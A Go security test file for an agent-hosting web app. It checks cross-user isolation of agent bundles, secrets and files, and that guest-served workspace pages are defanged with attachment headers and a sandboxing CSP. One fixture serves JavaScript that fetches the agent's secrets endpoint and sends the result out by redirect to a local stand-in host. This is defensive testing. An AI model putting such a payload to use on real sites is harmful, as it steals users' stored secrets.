package web

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/scott/castbot/internal/store"
)

func TestOtherUserCannotPullBundleSecretsOrFiles(t *testing.T) {
	h := newHarness(t)
	ctx := context.Background()
	owner, _ := h.account("owner-s03@example.com", "Owner", "correct-horse-1")
	other, otherSecret := h.account("other-s03@example.com", "Other", "correct-horse-1")
	sec, err := h.st.CreateSection(ctx, owner.ID, "Private")
	if err != nil {
		t.Fatal(err)
	}
	agent, _, err := h.st.CreateAgent(ctx, owner.ID, store.AgentInput{SectionID: sec.ID, Name: "Atlas", Title: "Helper", Status: "ready"})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := h.st.PutBundle(ctx, owner.ID, agent.ID, "1", "name: Atlas\n", "Bundle marker for owner only.\n"); err != nil {
		t.Fatal(err)
	}
	secRow, err := h.st.PutSecret(ctx, owner.ID, "FIXTURE_TOKEN", "fixture-value-s03")
	if err != nil {
		t.Fatal(err)
	}
	if err := h.st.GrantSecret(ctx, owner.ID, agent.ID, secRow.ID); err != nil {
		t.Fatal(err)
	}
	otherSec, err := h.st.CreateSection(ctx, other.ID, "Other")
	if err != nil {
		t.Fatal(err)
	}
	otherAgent, _, err := h.st.CreateAgent(ctx, other.ID, store.AgentInput{SectionID: otherSec.ID, Name: "Other", Title: "Helper", Status: "ready"})
	if err != nil {
		t.Fatal(err)
	}
	ip := "203.0.113.80:9"
	h.login("other-s03@example.com", "correct-horse-1", otherSecret, ip, false)
	const marker = "fixture-value-s03"
	for _, path := range []string{
		"/agents/" + agent.ID + "/bundle",
		"/agents/" + agent.ID + "/secrets",
		"/agents/" + agent.ID + "/files",
		"/agents/" + agent.ID + "/workspace",
		"/agents/" + agent.ID + "/workspace/notes.txt",
	} {
		code, body, _ := h.do(http.MethodGet, path, "", ip, nil)
		if code != http.StatusNotFound || strings.Contains(body, marker) || strings.Contains(body, "Bundle marker") {
			t.Fatalf("%s -> %d", path, code)
		}
	}
	boot, err := h.st.IssueBootstrap(ctx, other.ID, otherAgent.ID)
	if err != nil {
		t.Fatal(err)
	}
	token, err := h.st.ExchangeBootstrap(ctx, otherAgent.ID, boot)
	if err != nil {
		t.Fatal(err)
	}
	code, body, _ := h.do(http.MethodGet, "/api/castlet/agents/"+agent.ID+"/bundle", "", ip, map[string]string{"Authorization": "Bearer " + token})
	if code != http.StatusNotFound || strings.Contains(body, marker) || strings.Contains(body, "Bundle marker") {
		t.Fatalf("machine bundle %d", code)
	}
	code, body, _ = h.do(http.MethodGet, "/api/castlet/agents/"+agent.ID+"/secrets", "", ip, map[string]string{"Authorization": "Bearer " + token})
	if code != http.StatusNotFound || strings.Contains(body, marker) {
		t.Fatalf("machine secrets %d", code)
	}
	ownerBoot, err := h.st.IssueBootstrap(ctx, owner.ID, agent.ID)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := h.st.ExchangeBootstrap(ctx, agent.ID, ownerBoot); err != nil {
		t.Fatal(err)
	}
	if _, err := h.st.ExchangeBootstrap(ctx, agent.ID, ownerBoot); err == nil {
		t.Fatal("bootstrap token worked twice")
	}
}

func TestGuestPageCannotReadSecretValues(t *testing.T) {
	h := newHarness(t)
	ctx := context.Background()
	owner, secret := h.account("page@example.com", "Page", "correct-horse-1")
	sec, err := h.st.CreateSection(ctx, owner.ID, "Work")
	if err != nil {
		t.Fatal(err)
	}
	agent, _, err := h.st.CreateAgent(ctx, owner.ID, store.AgentInput{SectionID: sec.ID, Name: "Atlas", Title: "Helper", Status: "ready"})
	if err != nil {
		t.Fatal(err)
	}
	const secretValue = "probe-fixture-value"
	secRow, err := h.st.PutSecret(ctx, owner.ID, "PROBE_KEY", secretValue)
	if err != nil {
		t.Fatal(err)
	}
	if err := h.st.GrantSecret(ctx, owner.ID, agent.ID, secRow.ID); err != nil {
		t.Fatal(err)
	}
	guest := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/castlet/files/x.html":
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprintf(w, `<script src="/agents/%s/workspace/x.js"></script>`, agent.ID)
		case "/castlet/files/x.js":
			w.Header().Set("Content-Type", "text/javascript")
			fmt.Fprintf(w, `fetch("/agents/%s/secrets").then(function(r){return r.text()}).then(function(t){location="http://127.0.0.1:9/?q="+encodeURIComponent(t)})`, agent.ID)
		default:
			w.WriteHeader(http.StatusInternalServerError)
		}
	}))
	t.Cleanup(guest.Close)
	h.srv.SetGuest(agent.ID, guest.URL, "agent-token")
	ip := "203.0.113.90:9"
	h.login("page@example.com", "correct-horse-1", secret, ip, false)
	code, body, hdr := h.do(http.MethodGet, "/agents/"+agent.ID+"/workspace/x.html", "", ip, nil)
	if code != http.StatusOK {
		t.Fatalf("html %d", code)
	}
	if ct := hdr.Get("Content-Type"); ct != "application/octet-stream" {
		t.Fatalf("content type %q", ct)
	}
	if !strings.Contains(hdr.Get("Content-Disposition"), "attachment") {
		t.Fatalf("disposition %q", hdr.Get("Content-Disposition"))
	}
	if csp := hdr.Get("Content-Security-Policy"); !strings.Contains(csp, "sandbox") || !strings.Contains(csp, "default-src 'none'") {
		t.Fatalf("csp %q", csp)
	}
	code, body, hdr = h.do(http.MethodGet, "/agents/"+agent.ID+"/workspace/x.js", "", ip, nil)
	if code != http.StatusOK || hdr.Get("Content-Type") != "application/octet-stream" || !strings.Contains(hdr.Get("Content-Disposition"), "attachment") {
		t.Fatalf("js %d %q", code, hdr.Get("Content-Type"))
	}
	if strings.Contains(body, secretValue) {
		t.Fatal("script body contained a secret")
	}
	code, body, _ = h.do(http.MethodGet, "/agents/"+agent.ID+"/secrets", "", ip, nil)
	if code != http.StatusOK || !strings.Contains(body, "PROBE_KEY") || strings.Contains(body, secretValue) || strings.Contains(body, `"value"`) {
		t.Fatalf("owner secrets leaked: %d", code)
	}
	boot, err := h.st.IssueBootstrap(ctx, owner.ID, agent.ID)
	if err != nil {
		t.Fatal(err)
	}
	token, err := h.st.ExchangeBootstrap(ctx, agent.ID, boot)
	if err != nil {
		t.Fatal(err)
	}
	code, body, _ = h.do(http.MethodGet, "/api/castlet/agents/"+agent.ID+"/secrets", "", ip, map[string]string{"Authorization": "Bearer " + token})
	if code != http.StatusOK || !strings.Contains(body, secretValue) {
		t.Fatal("castlet can no longer pull a granted secret")
	}
	code, _, _ = h.do(http.MethodGet, "/agents/"+agent.ID+"/workspace/missing", "", ip, nil)
	if code != http.StatusBadGateway {
		t.Fatalf("guest 500 mapped to %d", code)
	}
}
